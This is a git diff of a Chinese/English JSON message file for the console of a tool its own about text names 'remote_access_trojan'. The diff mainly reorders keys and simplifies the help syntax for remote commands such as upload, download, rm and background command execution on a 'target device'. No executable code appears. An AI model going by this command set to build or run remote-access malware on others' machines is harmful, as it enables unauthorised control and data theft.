@@ -1,39 +1,7 @@
 {
-    "request_failed": {
-        "zh": "请求失败",
-        "en": "Request failed"
-    },
-    "device_list_title": {
-        "zh": "设备列表",
-        "en": "Device List"
-    },
-    "device_id": {
-        "zh": "设备ID",
-        "en": "Device ID"
-    },
-    "device_ip": {
-        "zh": "设备IP",
-        "en": "Device IP"
-    },
-    "device_info": {
-        "zh": "设备信息",
-        "en": "Device Info"
-    },
-    "device_not_found": {
-        "zh": "未找到设备",
-        "en": "Device not found"
-    },
-    "selected_device": {
-        "zh": "已选择设备",
-        "en": "Selected device"
-    },
-    "deleted_device": {
-        "zh": "已删除设备",
-        "en": "Deleted device"
-    },
-    "system_info_saved": {
-        "zh": "系统信息已保存到 systeminfo.json 文件中",
-        "en": "System information saved to systeminfo.json file"
+    "about_info": {
+        "zh": "关于：\n作者：赵博凯\n版权：Copyright © 赵博凯, All Rights Reserved.\n此为开源软件，链接：[link=https://github.com/zhaobokai341/remote_access_trojan]https://github.com/zhaobokai341/remote_access_trojan[/link]\n使用MIT协议，请自觉遵守协议",
+        "en": "About:\nAuthor: Zhao Bokai\nCopyright: Copyright © Zhao Bokai, All Rights Reserved.\nThis is open-source software, link: [link=https://github.com/zhaobokai341/remote_access_trojan]https://github.com/zhaobokai341/remote_access_trojan[/link]\nUses MIT license, please comply with the license"
     },
     "command_executed_in_background": {
         "zh": "已成功在后台运行命令",
@@ -43,41 +11,13 @@
         "zh": "命令执行失败",
         "en": "Command execution failed"
     },
-    "invalid_file_info": {
-        "zh": "无效的文件参数",
-        "en": "Invalid file parameters"
+    "compress_file_failed": {
+        "zh": "压缩文件失败",
+        "en": "Failed to compress file"
     },
-    "uploading_file": {
-        "zh": "正在上传文件",
-        "en": "Uploading file"
-    },
-    "file_upload_failed": {
-        "zh": "文件上传失败",
-        "en": "File upload failed"
-    },
-    "file_uploaded": {
-        "zh": "文件上传成功",
-        "en": "File upload success"
-    },
-    "downloading_file": {
-        "zh": "正在下载文件",
-        "en": "Downloading file"
-    },
-    "file_download_failed": {
-        "zh": "文件下载失败",
-        "en": "File download failed"
-    },
-    "file_downloaded": {
-        "zh": "文件下载成功",
-        "en": "File download success"
-    },
-    "directory_changed": {
-        "zh": "已切换工作目录",
-        "en": "Changed working directory"
-    },
-    "directory_change_failed": {
-        "zh": "切换工作目录失败",
-        "en": "Failed to change working directory"
+    "compressed_file": {
+        "zh": "已压缩文件",
+        "en": "File compressed"
     },
     "console_help_info": {
         "zh": [
@@ -95,12 +35,12 @@
             "[u bold yellow]cd <dir>[/u bold yellow]：[green]切换工作目录[/green]",
             "[u bold yellow]mkdir <directory>[/u bold yellow]：[green]创建目录[/green]",
             "[u bold yellow]rm <path>[/u bold yellow]：[green]删除文件或目录[/green]",
-            "[u bold yellow]compress <source path>(*.*)<target path>[/u bold yellow]：[green]压缩文件或目录[/green]",
-            "[u bold yellow]extract <source path>(*.*)<target path>[/u bold yellow]：[green]解压文件或目录[/green]",
-            "[u bold yellow]mv <old path>(*.*)<new path>[/u bold yellow]：[green]移动文件或目录[/green]",
+            "[u bold yellow]compress <source path> <target path>[/u bold yellow]：[green]压缩文件或目录[/green]",
+            "[u bold yellow]extract <source path> <target path>[/u bold yellow]：[green]解压文件或目录[/green]",
+            "[u bold yellow]mv <old path> <new path>[/u bold yellow]：[green]移动文件或目录[/green]",
             "[u bold yellow]cp <source path> <target path>[/u bold yellow]：[green]复制文件或目录[/green]",
-            "[u bold yellow]upload <local file path>(*.*)<target file path>[/u bold yellow]：[green]上传文件到目标设备[/green]",
-            "[u bold yellow]download <target file path>(*.*)<local file path>[/u bold yellow]：[green]从目标设备下载文件[/green]"
+            "[u bold yellow]upload <local file path> <target file path>[/u bold yellow]：[green]上传文件到目标设备[/green]",
+            "[u bold yellow]download <target file path> <local file path>[/u bold yellow]：[green]从目标设备下载文件[/green]"
         ],
         "en": [
             "Help Information:",
@@ -117,17 +57,145 @@
             "[u bold yellow]cd <dir>[/u bold yellow]: [green]Change working directory[/green]",
             "[u bold yellow]mkdir <directory>[/u bold yellow]: [green]Create directory[/green]",
             "[u bold yellow]rm <path>[/u bold yellow]: [green]Delete file or directory[/green]",
-            "[u bold yellow]compress <source path>(*.*)<target path>[/u bold yellow]: [green]Compress file or directory[/green]",
-            "[u bold yellow]extract <source path>(*.*)<target path>[/u bold yellow]: [green]Extract file or directory[/green]",
-            "[u bold yellow]mv <old path>(*.*)<new path>[/u bold yellow]: [green]Move file or directory[/green]",
+            "[u bold yellow]compress <source path> <target path>[/u bold yellow]: [green]Compress file or directory[/green]",
+            "[u bold yellow]extract <source path> <target path>[/u bold yellow]: [green]Extract file or directory[/green]",
+            "[u bold yellow]mv <old path> <new path>[/u bold yellow]: [green]Move file or directory[/green]",
             "[u bold yellow]cp <source path> <target path>[/u bold yellow]: [green]Copy file or directory[/green]",
-            "[u bold yellow]upload <local file path>(*.*)<target file path>[/u bold yellow]: [green]Upload file to target device[/green]",
-            "[u bold yellow]download <target file path>(*.*)<local file path>[/u bold yellow]: [green]Download file from target device[/green]"
+            "[u bold yellow]upload <local file path> <target file path>[/u bold yellow]: [green]Upload file to target device[/green]",
+            "[u bold yellow]download <target file path> <local file path>[/u bold yellow]: [green]Download file from target device[/green]"
         ]
     },
-    "unknown_command": {
-        "zh": "未知命令，输入help查看帮助",
-        "en": "Unknown command, type help for help"
+    "copied_file": {
+        "zh": "文件复制成功",
+        "en": "File copied successfully"
+    },
+    "copy_file_failed": {
+        "zh": "复制文件失败",
+        "en": "Failed to copy file"
+    },
+    "copyright": {
+        "zh": "版权所有：Copyright © 赵博凯, All Rights Reserved.",
+        "en": "Copyright: Copyright © Zhao Bokai, All Rights Reserved."
+    },
+    "delete_file_failed": {
+        "zh": "删除文件失败",
+        "en": "Failed to delete file"
+    },
+    "deleted_device": {
+        "zh": "已删除设备",
+        "en": "Deleted device"
+    },
+    "deleted_file": {
+        "zh": "已删除文件",
+        "en": "File deleted"
+    },
+    "device_id": {
+        "zh": "设备ID",
+        "en": "Device ID"
+    },
+    "device_info": {
+        "zh": "设备信息",
+        "en": "Device Info"
+    },
+    "device_ip": {
+        "zh": "设备IP",
+        "en": "Device IP"
+    },
+    "device_list_title": {
+        "zh": "设备列表",
+        "en": "Device List"
+    },
+    "device_not_found": {
+        "zh": "未找到设备",
+        "en": "Device not found"
+    },
+    "directory_change_failed": {
+        "zh": "切换工作目录失败",
+        "en": "Failed to change working directory"
+    },
+    "directory_changed": {
+        "zh": "已切换工作目录",
+        "en": "Changed working directory"
+    },
+    "directory_created": {
+        "zh": "目录创建成功",
+        "en": "Directory created successfully"
+    },
+    "directory_creation_failed": {
+        "zh": "创建目录失败",
+        "en": "Failed to create directory"
+    },
+    "downloading_file": {
+        "zh": "正在下载文件",
+        "en": "Downloading file"
+    },
+    "error_occurred": {
+        "zh": "发生错误",
+        "en": "Error occurred"
+    },
+    "extract_file_failed": {
+        "zh": "解压文件失败",
+        "en": "Failed to extract file"
+    },
+    "extracted_file": {
+        "zh": "已解压文件",
+        "en": "File extracted"
+    },
+    "file_download_failed": {
+        "zh": "文件下载失败",
+        "en": "File download failed"
+    },
+    "file_downloaded": {
+        "zh": "文件下载成功",
+        "en": "File download success"
+    },
+    "file_upload_failed": {
+        "zh": "文件上传失败",
+        "en": "File upload failed"
+    },
+    "file_uploaded": {
+        "zh": "文件上传成功",
+        "en": "File upload success"
+    },
+    "invalid_file_info": {
+        "zh": "无效的文件参数",
+        "en": "Invalid file parameters"
+    },
+    "move_file_failed": {
+        "zh": "文件移动失败",
+        "en": "Failed to move file"
+    },
+    "moved_file": {
+        "zh": "文件移动成功",
+        "en": "File moved successfully"
+    },
+    "no_command_specified": {
+        "zh": "未指定命令",
+        "en": "No command specified"
+    },
+    "no_device_id_specified": {
+        "zh": "未指定设备ID",
+        "en": "No device ID specified"
+    },
+    "no_directory_specified": {
+        "zh": "未指定目录",
+        "en": "No directory specified"
+    },
+    "no_file_name_specified": {
+        "zh": "未指定文件名",
+        "en": "No file name specified"
+    },
+    "program_starting": {
+        "zh": "程序启动",
+        "en": "Program starting"
+    },
+    "request_failed": {
+        "zh": "请求失败",
+        "en": "Request failed"
+    },
+    "selected_device": {
+        "zh": "已选择设备",
+        "en": "Selected device"
     },
     "server_help_info": {
         "zh": [
@@ -151,88 +219,36 @@
             "[u bold yellow]delete <id>[/u bold yellow]: [green]Delete connected device[/green]"
         ]
     },
-    "about_info": {
-        "zh": "关于：\n作者：赵博凯\n版权：Copyright © 赵博凯, All Rights Reserved.\n此为开源软件，链接：[link=https://github.com/zhaobokai341/remote_access_trojan]https://github.com/zhaobokai341/remote_access_trojan[/link]\n使用MIT协议，请自觉遵守协议",
-        "en": "About:\nAuthor: Zhao Bokai\nCopyright: Copyright © Zhao Bokai, All Rights Reserved.\nThis is open-source software, link: [link=https://github.com/zhaobokai341/remote_access_trojan]https://github.com/zhaobokai341/remote_access_trojan[/link]\nUses MIT license, please comply with the license"
+    "successfully": {
+        "zh": "successfully",
+        "en": "successfully"
     },
-    "copyright": {
-        "zh": "版权所有：Copyright © 赵博凯, All Rights Reserved.",
-        "en": "Copyright: Copyright © Zhao Bokai, All Rights Reserved."
+    "system_info_saved": {
+        "zh": "系统信息已保存到 systeminfo.json 文件中",
+        "en": "System information saved to systeminfo.json file"
     },
-    "program_starting": {
-        "zh": "程序启动",
-        "en": "Program starting"
+    "unknown_command": {
+        "zh": "未知命令，输入help查看帮助",
+        "en": "Unknown command, type help for help"
     },
-    "verifying_password": {
-        "zh": "正在验证密码",
-        "en": "Verifying password"
-    },
-    "verification_successful": {
-        "zh": "验证成功，cookie",
-        "en": "Verification successful, cookie"
-    },
-    "verification_failed": {
-        "zh": "验证失败",
-        "en": "Verification failed"
-    },
-    "error_occurred": {
-        "zh": "发生错误",
-        "en": "Error occurred"
+    "uploading_file": {
+        "zh": "正在上传文件",
+        "en": "Uploading file"
     },
     "user_interrupted": {
         "zh": "用户手动中断",
         "en": "User interrupted"
     },
-    "compressed_file": {
-        "zh": "已压缩文件",
-        "en": "File compressed"
+    "verification_failed": {
+        "zh": "验证失败",
+        "en": "Verification failed"
     },
-    "compress_file_failed": {
-        "zh": "压缩文件失败",
-        "en": "Failed to compress file"
+    "verification_successful": {
+        "zh": "验证成功，cookie",
+        "en": "Verification successful, cookie"
     },
-    "extracted_file": {
-        "zh": "已解压文件",
-        "en": "File extracted"
-    },
-    "extract_file_failed": {
-        "zh": "解压文件失败",
-        "en": "Failed to extract file"
-    },
-    "deleted_file": {
-        "zh": "已删除文件",
-        "en": "File deleted"
-    },
-    "delete_file_failed": {
-        "zh": "删除文件失败",
-        "en": "Failed to delete file"
-    },
-    "moved_file": {
-        "zh": "文件移动成功",
-        "en": "File moved successfully"
-    },
-    "move_file_failed": {
-        "zh": "文件移动失败",
-        "en": "Failed to move file"
-    },
-    "directory_created": {
-        "zh": "目录创建成功",
-        "en": "Directory created successfully"
-    },
-    "directory_creation_failed": {
-        "zh": "创建目录失败",
-        "en": "Failed to create directory"
-    },
-    "copied_file": {
-        "zh": "文件复制成功",
-        "en": "File copied successfully"
-    },
-    "copy_file_failed": {
-        "zh": "复制文件失败",
-        "en": "Failed to copy file"
-    },
-    "successfully": {
-        "zh": "successfully",
-        "en": "successfully"
+    "verifying_password": {
+        "zh": "正在验证密码",
+        "en": "Verifying password"
     }
 }
